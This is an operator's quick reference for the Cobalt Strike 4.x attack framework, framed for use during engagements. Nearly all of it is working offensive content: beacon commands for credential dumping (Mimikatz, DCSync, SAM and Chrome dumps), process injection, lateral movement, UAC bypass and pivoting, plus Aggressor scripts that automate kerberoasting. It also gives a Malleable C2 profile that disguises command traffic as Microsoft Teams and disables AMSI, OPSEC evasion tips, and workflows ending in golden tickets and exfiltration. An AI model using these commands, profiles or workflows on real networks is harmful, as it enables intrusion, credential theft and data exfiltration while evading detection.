# Cobalt Strike Quick Reference

> Operational reference for Cobalt Strike 4.x beacon commands, Malleable C2,
> Aggressor scripting, and BOF development. Organized for rapid lookup during engagements.

---

## Beacon Core Commands

### Execution

```
shell <command>              # Run cmd.exe /c <command> (fork & run, visible in process tree)
run <command>                # Run command and display output (no cmd.exe)
execute <command>            # Run command with no output capture
powershell <cmdlet>          # powershell.exe -nop -exec bypass -EncodedCommand ...
powerpick <cmdlet>           # Unmanaged PowerShell (no powershell.exe process)
execute-assembly <path> <args>  # Load and run .NET assembly in memory (fork & run)
inline-execute <bof> <args>  # Run BOF in beacon's process (no fork & run)
psinject <pid> <arch> <cmd>  # Inject PowerShell into remote process
```

### File Operations

```
ls <path>                    # List directory contents
cd <path>                    # Change working directory
pwd                          # Print working directory
mkdir <path>                 # Create directory
rm <path>                    # Delete file or directory
cp <src> <dst>               # Copy file
mv <src> <dst>               # Move file
upload <local_path>          # Upload file to beacon host
download <remote_path>       # Download file from beacon host
downloads                    # List active downloads
cancel <download_id>         # Cancel a download
timestomp <src> <dst>        # Match file timestamps (OPSEC)
```

### Process Management

```
ps                           # List running processes (with owner and architecture)
kill <pid>                   # Kill a process
inject <pid> <arch> <listener>  # Inject beacon shellcode into process
shinject <pid> <arch> <raw_file>  # Inject arbitrary shellcode
dllinject <pid> <dll_path>   # Inject reflective DLL
spawnas <domain\user> <pass> <listener>  # Spawn beacon as another user
spawnu <pid> <listener>      # Spawn and inject under parent PID (PPID spoofing)
runu <pid> <command>         # Run command under different parent PID
```

### Credential Operations

```
hashdump                     # Dump SAM database (local hashes, requires SYSTEM)
logonpasswords               # Mimikatz sekurlsa::logonpasswords (fork & run)
dcsync <DOMAIN> <user>       # DCSync via Mimikatz (requires DA or replication rights)
chromedump                   # Dump Chrome saved passwords
mimikatz <cmd>               # Run arbitrary Mimikatz command
   mimikatz !lsadump::cache  # Cached credentials
   mimikatz !vault::list     # Credential vault
   mimikatz @               # Execute on DC via DCSync
make_token <domain\user> <pass>  # Create token for network auth (pass-the-password)
steal_token <pid>            # Steal token from running process
rev2self                     # Revert to original token
kerberos_ticket_use <kirbi>  # Load Kerberos ticket into session
kerberos_ccache_use <ccache> # Load ccache format ticket
kerberos_ticket_purge        # Purge all Kerberos tickets
```

### Lateral Movement

```
# jump -- spawn a beacon on remote target
jump psexec <target> <listener>       # Service EXE upload
jump psexec_psh <target> <listener>   # PowerShell one-liner via service
jump psexec64 <target> <listener>     # 64-bit service EXE
jump winrm <target> <listener>        # PowerShell via WinRM
jump winrm64 <target> <listener>      # 64-bit WinRM

# remote-exec -- execute command on remote target (no beacon)
remote-exec wmi <target> <command>    # WMI process creation
remote-exec winrm <target> <command>  # WinRM command execution
remote-exec psexec <target> <command> # Service-based command execution

# Linking beacons
link <target> <pipe_name>            # Connect to SMB beacon
connect <target> <port>              # Connect to TCP beacon
```

### Pivoting & Networking

```
socks <port>                 # Start SOCKS4a proxy on team server
socks stop                   # Stop SOCKS proxy
rportfwd <bind_port> <fwd_host> <fwd_port>  # Reverse port forward
rportfwd_local <bind_port> <fwd_host> <fwd_port>  # Reverse port forward (local)
rportfwd stop <bind_port>   # Stop reverse port forward
covertvpn <interface> <ip/mask>  # VPN pivot (Layer 2)
portscan <targets> <ports> <method>  # Port scan (arp, icmp, none)
   portscan 10.10.10.0/24 1-1024,3389,5985 arp
net <command>                # Network enumeration
   net domain               # Domain information
   net computers            # Domain computers
   net dclist               # Domain controllers
   net domain_trusts        # Domain trusts
   net logons               # Logged on users
   net sessions             # Active sessions
   net view                 # Shared resources
```

### Privilege Escalation

```
elevate svc-exe <listener>            # Service executable (requires local admin)
elevate uac-token-duplication <listener>  # UAC bypass
getuid                                # Current user context
getsystem                            # Get SYSTEM via named pipe impersonation
getprivs                             # Enable available privileges
runas <domain\user> <pass> <cmd>     # Run as different user
ppid <pid>                           # Set parent PID for spawned processes
blockdlls start                      # Block non-Microsoft DLLs in child processes
argue <cmd> <fake_args>              # Spoof command line arguments
```

---

## Aggressor Script Essentials

```java
# Custom alias example
alias whoami {
    bshell($1, "whoami /all");
}

# Event handler -- log new beacons
on beacon_initial {
    local('$bid $user $host');
    $bid = $1;
    $user = binfo($bid, "user");
    $host = binfo($bid, "computer");
    elog("[+] New beacon: $user @ $host (Beacon ID: $bid)");
}

# Custom popup menu
popup beacon_bottom {
    item "Quick Situational Awareness" {
        foreach $bid ($1) {
            bshell($bid, "whoami /all");
            bshell($bid, "ipconfig /all");
            bshell($bid, "net localgroup administrators");
            bps($bid);
        }
    }
    item "Kerberoast" {
        foreach $bid ($1) {
            bexecute_assembly($bid, script_resource("Rubeus.exe"), "kerberoast /nowrap");
        }
    }
}

# Heartbeat checker -- alert if beacon goes silent
on heartbeat_1m {
    foreach $bid (beacons()) {
        $last = binfo($bid, "lastf");
        if ($last > 600000) {  # 10 minutes
            elog("[!] Beacon " . $bid . " silent for > 10 minutes");
        }
    }
}
```

### Common Community Aggressor Scripts

- **Harleyqu1nn**: Collection of situational awareness and attack scripts
- **rasta-mouse**: Quality-of-life scripts for beacon management
- **outflanknl**: Custom BOF integrations
- **Cobalt-Clip**: Clipboard monitoring via BOF

---

## Beacon Object Files (BOFs)

### Concept

BOFs are position-independent C code compiled to COFF object files that execute
directly inside Beacon's process memory. No fork & run, no child process, minimal
forensic artifacts.

### Development Basics

```c
// example_bof.c
#include <windows.h>
#include "beacon.h"

// Use Dynamic Function Resolution (DFR) for API calls
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GetComputerNameA(LPSTR, LPDWORD);

void go(char *args, int alen) {
    char hostname[256];
    DWORD size = sizeof(hostname);
    if (KERNEL32$GetComputerNameA(hostname, &size)) {
        BeaconPrintf(CALLBACK_OUTPUT, "Hostname: %s", hostname);
    }
}
```

```bash
# Compile BOF (MinGW)
x86_64-w64-mingw32-gcc -c example_bof.c -o example_bof.x64.o
i686-w64-mingw32-gcc -c example_bof.c -o example_bof.x86.o
```

### Key BOF Collections

| BOF | Purpose |
|---|---|
| **SA (Situational Awareness)** | whoami, netstat, arp, ldapsearch, etc. |
| **nanodump** | LSASS dump using MiniDumpWriteDump or syscalls |
| **InlineExecute-Assembly** | Run .NET assemblies without fork & run |
| **BOF.NET** | .NET runtime hosting inside beacon process |
| **FindObjects-BOF** | Search for named pipes, mutexes, events |
| **CredBandit** | In-process credential harvesting |
| **Outflank C2 Tools** | Service management, registry, WMI, LDAP |
| **bof-ForeignLsass** | Dump LSASS via foreign process |

---

## Malleable C2 Profiles

### Profile Structure

```
# Example: mimicking Microsoft Teams traffic

set sample_name "Teams Profile";
set sleeptime "30000";         # 30 second callback
set jitter "37";               # 37% jitter
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

# HTTPS certificate
https-certificate {
    set CN "teams.microsoft.com";
    set O "Microsoft Corporation";
    set OU "Microsoft IT";
}

http-get {
    set uri "/api/v1/users/me/conversations";
    client {
        header "Accept" "application/json";
        header "Authorization" "Bearer eyJ0eXAi..."; # Fake JWT
        metadata {
            base64url;
            prepend "auth_token=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/json";
        header "Server" "Microsoft-IIS/10.0";
        output {
            base64;
            prepend "{\"conversations\":[{\"data\":\"";
            append "\"}]}";
            print;
        }
    }
}

http-post {
    set uri "/api/v1/users/me/messages";
    client {
        header "Content-Type" "application/json";
        id {
            base64url;
            parameter "messageId";
        }
        output {
            base64;
            prepend "{\"content\":\"";
            append "\"}";
            print;
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            base64;
            prepend "{\"status\":\"sent\",\"payload\":\"";
            append "\"}";
            print;
        }
    }
}

# Process injection configuration
process-inject {
    set min_alloc "17500";
    set startrwx "false";
    set userwx "false";
    transform-x64 { prepend "\x90\x90"; }
    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart";
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

# Post-exploitation configuration
post-ex {
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set pipename "Winsock2\\CatalogChangeListener-###-0";
}
```

### Profile Validation

```bash
# Check profile syntax
./c2lint malleable.profile

# Common issues: missing semicolons, mismatched braces, invalid transforms
```

---

## OPSEC Decision Matrix

| Action | Method | OPSEC Impact | Recommendation |
|---|---|---|---|
| Run .NET tool | execute-assembly | Medium (fork & run) | Use BOF or inline-execute |
| Run PowerShell | powershell | High (powershell.exe) | Use powerpick or BOF |
| Dump credentials | logonpasswords | High (LSASS access) | Use nanodump BOF |
| Lateral movement | jump psexec | High (service + binary) | Use jump winrm or SMB beacon |
| Port scan | portscan | Medium (network noise) | Use small target ranges, arp method |
| File download | download | Low | Normal unless DLP in place |
| Token theft | steal_token | Low | Prefer make_token if creds known |

---

## Common Operational Workflows

```
# Initial access -> situational awareness
checkin -> sleep 30 37 -> whoami -> pwd -> ps -> net domain -> net dclist

# Privilege escalation path
hashdump -> make_token DOMAIN\localadmin <pass> -> jump winrm TARGET listener

# Domain compromise
execute-assembly Rubeus.exe kerberoast /nowrap -> crack offline ->
dcsync DOMAIN krbtgt -> golden ticket -> laterally move at will

# Data staging and exfiltration
download C:\sensitive\data.xlsx -> downloads -> sync files from team server
```
